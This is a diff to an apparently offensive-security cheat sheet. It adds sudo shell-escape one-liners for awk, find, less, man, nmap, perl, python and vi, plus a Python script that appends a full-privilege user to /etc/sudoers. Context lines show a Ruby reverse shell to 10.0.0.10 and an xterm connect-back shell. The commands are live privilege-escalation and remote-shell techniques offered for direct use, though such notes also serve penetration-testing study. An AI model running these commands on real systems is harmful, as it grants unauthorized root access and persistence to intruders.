@@ -160,13 +160,28 @@ linuxprivchecker.py
 lynis audit system remote <target IP>
 
 - sudoers
-cat /etc/sudoers                          Contains the rules that users must follow when using the sudo command
-                                          Example: the user lee has root privs when running nmap
-echo "os.execute('/bin/sh')" > test.nse
-sudo -u lee nmap --script=test.nse
+sudo -l                                   Check for binaries that can be ran with root privs
 
--find
-sudo find /home -exec /bin/bash \;        Escalate to a root shell
+- Abuse binaries
+sudo apache2 -f /etc/shadow               View a system file.
+sudo awk 'BEGIN {system("/bin/bash")}'
+sudo find /home -exec /bin/bash \;
+sudo less /etc/hosts                      !bash and hit enter
+sudo man man                              !bash and hit enter
+sudo more /etc/hosts                      !bash and hit enter
+echo "os.execute('/bin/bash')" > test.nse && sudo nmap --script=test.nse
+sudo perl -e 'exec "/bin/bash";'
+sudo python -c 'import pty;pty.spawn("/bin/bash")'
+sudo vi
+
+- Add a user to sudoers.
+#!/usr/bin/env python
+import os
+import sys
+try:
+     os.system('echo "username ALL=(ALL:ALL) ALL" >> /etc/sudoers')
+except:
+     sys.exit()
 
 - Check for binaries with the Sticky bit, SUID, and GUID.
 find / -perm -1000 -type d 2>/dev/null    Sticky bit - only the owner of a directory or a file can delete or rename.
@@ -282,7 +297,7 @@ ruby -rsocket -e'f=TCPSocket.open("10.0.0.10",4443).to_i;exec sprintf("/bin/sh -
 - xterm
 xterm -display 10.0.0.10:1           target - it will connect back to you on TCP port 6001.
 Xnest :1                             attacker - catch the incoming xterm, start an X-Server.
-xhost +targetIP                      attacker - authorise the target to connect to you.
+xhost +targetIP                      attacker - authorize the target to connect to you.
 ------------------------------------------------------------------------------------------------------
 
 # Screen
@@ -429,7 +444,7 @@ Remote Kali                          vncserver -kill :1
 Python                               python -c 'import pty; pty.spawn("/bin/bash")'
 sh                                   echo os.system('/bin/bash')
 sh                                   /bin/sh -i
-Perl                                 perl —e 'exec "/bin/sh";'
+Perl                                 perl —e 'exec "/bin/bash";'
 Perl                                 exec "/bin/sh";
 Ruby                                 exec "/bin/sh"
 Lua                                  os.execute('/bin/sh')
